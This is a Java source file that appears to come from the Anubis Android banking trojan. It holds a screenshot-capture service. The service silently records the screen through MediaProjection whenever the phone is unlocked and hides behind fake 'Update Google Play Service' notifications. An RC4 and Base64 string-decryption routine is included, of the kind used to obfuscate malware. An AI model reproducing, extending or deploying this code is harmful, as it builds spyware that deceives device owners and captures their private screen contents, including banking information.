package anubis.bot.myapplication.API.Screenshot;

import android.annotation.TargetApi;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaScannerConnection;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;

public class ServiceScreenshot extends Service {

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

  private static final int NOTIFY_ID=9906;
   static final String EXTRA_RESULT_CODE="resultCode";
   static final String EXTRA_RESULT_INTENT="resultIntent";
  static final int VIRT_DISPLAY_FLAGS=
      DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY |
      DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
  private MediaProjection projection;
  private VirtualDisplay vdisplay;
  final private HandlerThread handlerThread=
    new HandlerThread(getClass().getSimpleName(),
      android.os.Process.THREAD_PRIORITY_BACKGROUND);
  private Handler handler;
  private MediaProjectionManager mgr;
  private WindowManager wmgr;
  private ImageTransmogrifier it;
  private int resultCode;
  private Intent resultData;
  private Context context;
    private Notification notif;
    Intent intent;



 UtilsClass utilsClass = new UtilsClass();


  @Override
 @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  public void onCreate() {
    super.onCreate();
    context = this;
    mgr=(MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
    wmgr=(WindowManager)getSystemService(WINDOW_SERVICE);
    handlerThread.start();
    handler=new Handler(handlerThread.getLooper());
  }


  @Override
  @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  public int onStartCommand(Intent i, int flags, int startId) {
    context = this;
    intent = i;
    if (i.getAction()==null) {
      resultCode=i.getIntExtra(EXTRA_RESULT_CODE, 1337);
      resultData=i.getParcelableExtra(EXTRA_RESULT_INTENT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            utilsClass.LoadLibNotification(this, "Google", "Update Google Play Service");
        }else{
            foregroundify();
        }
      new Thread() {

        @Override
        public void run() {
          KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
          boolean locked = km.inKeyguardRestrictedInputMode();
          if (!locked)startCapture();
        }
      }.start();
   }
    return(START_NOT_STICKY);
  }


  @Override
  @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  public void onDestroy() {
    super.onDestroy();
  }


  @Override
  @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  public IBinder onBind(Intent intent) {
    throw new IllegalStateException("");
  }

  WindowManager getWindowManager() {
    return(wmgr);
  }

  Handler getHandler() {
    return(handler);
  }

  void processImage(final byte[] png) {
    new Thread() {
      @Override
      public void run() {
        File output=new File(getExternalFilesDir(null),"screenshot.jpg");
          try {
          FileOutputStream fos=new FileOutputStream(output);

          fos.write(png);
          fos.flush();
          fos.getFD().sync();
          fos.close();

          MediaScannerConnection.scanFile(ServiceScreenshot.this,
            new String[] {output.getAbsolutePath()},
            new String[] {"image/jpg"},
            null);
        }
        catch (Exception e) {
          utilsClass.Log(getClass().getSimpleName().toString(), "Exception writing out screenshot");
        }
      }
    }.start();
  }

  @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  private void startCapture() {
    try {
      projection = mgr.getMediaProjection(resultCode, resultData);
      it = new ImageTransmogrifier(this);

      MediaProjection.Callback cb = new MediaProjection.Callback() {
        @Override
        public void onStop() {
          vdisplay.release();
        }
      };

      vdisplay = projection.createVirtualDisplay("andshooter", it.getWidth(), it.getHeight(),
              getResources().getDisplayMetrics().densityDpi, VIRT_DISPLAY_FLAGS, it.getSurface(), null, handler);
      projection.registerCallback(cb, handler);
    }catch (Exception ex){
      utilsClass.Log("error",ex.getMessage());
    }
  }

  @TargetApi(Build.VERSION_CODES.LOLLIPOP)
  private void foregroundify() {
      notif = new Notification.Builder(context)
              .setContentTitle("Info")
              .setContentText("Update Google Play")
              .setSmallIcon(R.drawable.im)
              .build();
    startForeground(NOTIFY_ID,notif);
  }
}
